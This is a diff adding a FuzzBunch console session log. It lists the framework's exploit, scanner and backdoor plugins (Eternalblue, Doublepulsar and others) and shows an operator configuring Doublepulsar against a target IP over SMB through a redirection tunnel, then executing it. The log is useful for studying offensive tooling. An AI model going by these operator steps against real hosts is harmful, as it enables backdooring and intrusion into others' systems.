@@ -1,0 +1,441 @@
+[+] Set Project => test
+
+fb > run
+[-] Unknown syntax: run
+fb > help
+
+Core Commands
+=============
+
+  Command         Description
+  -------         -----------
+  !               Shortcut for shell
+  ?               Shortcut for help
+  autorun         Set autorun mode
+  back            Leave the current context back to the default
+  banner          Print the startup banner
+  changeprompt    Change the command prompt
+  echo            Echo a message
+  enter           Enter the context of a plugin
+  eof             Quit program (CTRL-D)
+  exit            Alias for back
+  help            Print out help
+  history         Run a previous command.
+  info            Print information about the current context
+  mark            Mark a session item
+  python          Drop to an interactive Python interpreter
+  quit            Quit fuzzbunch
+  redirect        Configure redirection
+  resizeconsole   None
+  retarget        Set basic target info
+  script          Run a script
+  session         Show session items
+  setg            Set a global variable
+  shell           Execute a shell command
+  show            Show plugin info
+  sleep           Sleep for n seconds
+  standardop      Print standard OP usage message
+  toolpaste       Paste and convert data from external tool output
+  unsetg          Unset a global variable
+  use             Activate a plugin for use and enter context
+
+fb > redirect
+
+[+] Redirection ON
+fb > shell
+fb > echo a
+[*] a
+fb > use
+
+Plugin Category: ImplantConfig
+==============================
+
+  Name           Version
+  ----           -------
+  Darkpulsar     1.1.0
+  Mofconfig      1.0.0
+
+
+Plugin Category: ListeningPost
+==============================
+
+  Name     Version
+  ----     -------
+
+
+Plugin Category: Exploit
+========================
+
+  Name                   Version
+  ----                   -------
+  Easybee                1.0.1
+  Easypi                 3.1.0
+  Eclipsedwing           1.5.2
+  Educatedscholar        1.0.0
+  Emeraldthread          3.0.0
+  Emphasismine           3.4.0
+  Englishmansdentist     1.2.0
+  Erraticgopher          1.0.1
+  Eskimoroll             1.1.1
+  Esteemaudit            2.1.0
+  Eternalromance         1.3.0
+  Eternalsynergy         1.0.1
+  Ewokfrenzy             2.0.0
+  Explodingcan           2.0.2
+  Zippybeer              1.0.2
+
+
+Plugin Category: Touch
+======================
+
+  Name                     Version
+  ----                     -------
+  Architouch               1.0.0
+  Domaintouch              1.1.1
+  Eclipsedwingtouch        1.0.4
+  Educatedscholartouch     1.0.0
+  Emeraldthreadtouch       1.0.0
+  Erraticgophertouch       1.0.1
+  Esteemaudittouch         2.1.0
+  Explodingcantouch        1.2.1
+  Iistouch                 1.2.2
+  Namedpipetouch           2.0.0
+  Printjobdelete           1.0.0
+  Printjoblist             1.0.0
+  Rpctouch                 2.1.0
+  Smbtouch                 1.1.1
+  Webadmintouch            1.0.1
+  Worldclienttouch         1.0.1
+
+
+Plugin Category: Payload
+========================
+
+  Name              Version
+  ----              -------
+  Doublepulsar      1.3.1
+  Jobadd            1.1.1
+  Jobdelete         1.1.1
+  Joblist           1.1.1
+  Pcdlllauncher     2.3.1
+  Processlist       1.1.1
+  Regdelete         1.1.1
+  Regenum           1.1.1
+  Regread           1.1.1
+  Regwrite          1.1.1
+  Rpcproxy          1.0.1
+  Smbdelete         1.1.1
+  Smblist           1.1.1
+  Smbread           1.1.1
+  Smbwrite          1.1.1
+
+
+Plugin Category: Special
+========================
+
+  Name                Version
+  ----                -------
+  Eternalblue         2.2.0
+  Eternalchampion     2.0.0
+
+fb > ?
+
+Core Commands
+=============
+
+  Command         Description
+  -------         -----------
+  !               Shortcut for shell
+  ?               Shortcut for help
+  autorun         Set autorun mode
+  back            Leave the current context back to the default
+  banner          Print the startup banner
+  changeprompt    Change the command prompt
+  echo            Echo a message
+  enter           Enter the context of a plugin
+  eof             Quit program (CTRL-D)
+  exit            Alias for back
+  help            Print out help
+  history         Run a previous command.
+  info            Print information about the current context
+  mark            Mark a session item
+  python          Drop to an interactive Python interpreter
+  quit            Quit fuzzbunch
+  redirect        Configure redirection
+  resizeconsole   None
+  retarget        Set basic target info
+  script          Run a script
+  session         Show session items
+  setg            Set a global variable
+  shell           Execute a shell command
+  show            Show plugin info
+  sleep           Sleep for n seconds
+  standardop      Print standard OP usage message
+  toolpaste       Paste and convert data from external tool output
+  unsetg          Unset a global variable
+  use             Activate a plugin for use and enter context
+
+fb > exe
+[-] Unknown syntax: exe
+fb > run
+[-] Unknown syntax: run
+fb > use
+
+Plugin Category: ImplantConfig
+==============================
+
+  Name           Version
+  ----           -------
+  Darkpulsar     1.1.0
+  Mofconfig      1.0.0
+
+
+Plugin Category: ListeningPost
+==============================
+
+  Name     Version
+  ----     -------
+
+
+Plugin Category: Exploit
+========================
+
+  Name                   Version
+  ----                   -------
+  Easybee                1.0.1
+  Easypi                 3.1.0
+  Eclipsedwing           1.5.2
+  Educatedscholar        1.0.0
+  Emeraldthread          3.0.0
+  Emphasismine           3.4.0
+  Englishmansdentist     1.2.0
+  Erraticgopher          1.0.1
+  Eskimoroll             1.1.1
+  Esteemaudit            2.1.0
+  Eternalromance         1.3.0
+  Eternalsynergy         1.0.1
+  Ewokfrenzy             2.0.0
+  Explodingcan           2.0.2
+  Zippybeer              1.0.2
+
+
+Plugin Category: Touch
+======================
+
+  Name                     Version
+  ----                     -------
+  Architouch               1.0.0
+  Domaintouch              1.1.1
+  Eclipsedwingtouch        1.0.4
+  Educatedscholartouch     1.0.0
+  Emeraldthreadtouch       1.0.0
+  Erraticgophertouch       1.0.1
+  Esteemaudittouch         2.1.0
+  Explodingcantouch        1.2.1
+  Iistouch                 1.2.2
+  Namedpipetouch           2.0.0
+  Printjobdelete           1.0.0
+  Printjoblist             1.0.0
+  Rpctouch                 2.1.0
+  Smbtouch                 1.1.1
+  Webadmintouch            1.0.1
+  Worldclienttouch         1.0.1
+
+
+Plugin Category: Payload
+========================
+
+  Name              Version
+  ----              -------
+  Doublepulsar      1.3.1
+  Jobadd            1.1.1
+  Jobdelete         1.1.1
+  Joblist           1.1.1
+  Pcdlllauncher     2.3.1
+  Processlist       1.1.1
+  Regdelete         1.1.1
+  Regenum           1.1.1
+  Regread           1.1.1
+  Regwrite          1.1.1
+  Rpcproxy          1.0.1
+  Smbdelete         1.1.1
+  Smblist           1.1.1
+  Smbread           1.1.1
+  Smbwrite          1.1.1
+
+
+Plugin Category: Special
+========================
+
+  Name                Version
+  ----                -------
+  Eternalblue         2.2.0
+  Eternalchampion     2.0.0
+
+fb > use Doublepulsar
+
+[!] Entering Plugin Context :: Doublepulsar
+[*] Applying Global Variables
+[+] Set NetworkTimeout => 60
+[+] Set TargetIp => 10.168.55.50
+
+fb Payload (Doublepulsar) > apply
+[*] Applying Session Parameters
+fb Payload (Doublepulsar) > prompt confirm
+
+[!] Enter Prompt Mode :: Doublepulsar
+
+Module: Doublepulsar
+====================
+
+Name              Value                                                 
+----              -----                                                 
+NetworkTimeout    60                                                    
+TargetIp          10.168.55.50                                          
+TargetPort        445                                                   
+OutputFile                                                              
+Protocol          SMB                                                   
+Architecture      x86                                                   
+Function          OutputInstall                                         
+
+[!] Plugin Variables are NOT Valid
+
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
+
+
+[*]  TargetIp :: Target IP Address
+
+
+[*]  TargetPort :: Port used by the Double Pulsar back door
+
+
+[*]  Protocol :: Protocol for the backdoor to speak
+
+   *0) SMB     Ring 0 SMB (TCP 445) backdoor
+    1) RDP     Ring 0 RDP (TCP 3389) backdoor
+
+
+[*]  Architecture :: Architecture of the target OS
+
+   *0) x86     x86 32-bits
+    1) x64     x64 64-bits
+
+
+[*]  Function :: Operation for backdoor to perform
+
+   *0) OutputInstall     Only output the install shellcode to a binary file on disk.
+    1) Ping              Test for presence of backdoor
+    2) RunDLL            Use an APC to inject a DLL into a user mode process.
+    3) RunShellcode      Run raw shellcode
+    4) Uninstall         Remove's backdoor from system
+
+
+[*]  OutputFile :: Full path to the output file
+
+
+[*]  OutputFile :: Full path to the output file
+
+
+[*]  OutputFile :: Full path to the output file
+
+
+[*]  OutputFile :: Full path to the output file
+
+
+[*]  OutputFile :: Full path to the output file
+
+[+] Set OutputFile => exit
+
+fb Payload (Doublepulsar) > execute
+
+[!] Preparing to Execute Doublepulsar
+[*] Redirection ON
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[+] (TCP) Local 127.0.0.1:445 -> 10.168.55.50:445
+
+[+] Configure Plugin Remote Tunnels
+
+
+Local
+=====
+
+Proto   Listen IP       Source IP        Destination IP  
+-----   -------------   --------------   ----------------
+TCP     127.0.0.1:445   Redirector:ANY   10.168.55.50:445
+
+Remote
+======
+
+ *empty* 
+
+[!] Verify Redirection Tunnels Exist
+
+Module: Doublepulsar
+====================
+
+Name              Set Value        Redirected Value    
+----              ---------        ----------------    
+NetworkTimeout    60                                   
+TargetIp          10.168.55.50     127.0.0.1           
+TargetPort        445              445                 
+OutputFile        exit                                 
+Protocol          SMB                                  
+Architecture      x86                                  
+Function          OutputInstall                        
+
+[*] Executing Plugin
+[+] Doublepulsar Succeeded
+
+fb Payload (Doublepulsar) > 
+fb Payload (Doublepulsar) > 
+fb Payload (Doublepulsar) > 
+fb Payload (Doublepulsar) > 
+fb Payload (Doublepulsar) > 
+fb Payload (Doublepulsar) > 
+fb Payload (Doublepulsar) > exit
+fb > exit
+fb > 
+fb > 
+fb > 
+fb > 
+fb > exit
+fb > exit
+fb > help
+
+Core Commands
+=============
+
+  Command         Description
+  -------         -----------
+  !               Shortcut for shell
+  ?               Shortcut for help
+  autorun         Set autorun mode
+  back            Leave the current context back to the default
+  banner          Print the startup banner
+  changeprompt    Change the command prompt
+  echo            Echo a message
+  enter           Enter the context of a plugin
+  eof             Quit program (CTRL-D)
+  exit            Alias for back
+  help            Print out help
+  history         Run a previous command.
+  info            Print information about the current context
+  mark            Mark a session item
+  python          Drop to an interactive Python interpreter
+  quit            Quit fuzzbunch
+  redirect        Configure redirection
+  resizeconsole   None
+  retarget        Set basic target info
+  script          Run a script
+  session         Show session items
+  setg            Set a global variable
+  shell           Execute a shell command
+  show            Show plugin info
+  sleep           Sleep for n seconds
+  standardop      Print standard OP usage message
+  toolpaste       Paste and convert data from external tool output
+  unsetg          Unset a global variable
+  use             Activate a plugin for use and enter context
+
